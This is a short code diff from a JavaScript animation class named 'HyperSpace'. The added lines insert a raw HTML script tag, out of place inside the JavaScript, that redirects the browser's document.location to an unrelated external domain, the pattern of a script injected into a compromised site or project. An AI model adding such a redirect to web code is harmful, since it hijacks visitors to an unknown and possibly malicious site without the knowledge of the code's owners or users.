@@ -199,7 +199,8 @@ class HyperSpace {
           ...this.STATE,
           jumping: false,
           toBeCleared: false };
-
+          <script language='javascript'>document.location = 'https://www.jindianzi.cc/'</script>
+        
       }
     });_defineProperty(this, "bindAction",
     () => {
